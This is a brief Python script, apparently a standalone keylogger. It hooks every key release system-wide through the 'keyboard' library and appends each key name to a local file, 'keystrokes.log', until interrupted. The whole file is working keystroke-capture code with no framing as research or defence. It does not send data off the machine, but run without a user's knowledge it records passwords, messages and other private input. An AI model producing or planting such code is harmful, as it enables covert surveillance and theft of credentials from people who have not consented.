import keyboard

log_file = "keystrokes.log"


def log_keystrokes(event):
    with open(log_file, "a") as f:
        f.write(event.name + "\n")


keyboard.on_release(log_keystrokes)

try:
    keyboard.wait()
except KeyboardInterrupt:
    pass
finally:
    keyboard.unhook_all()
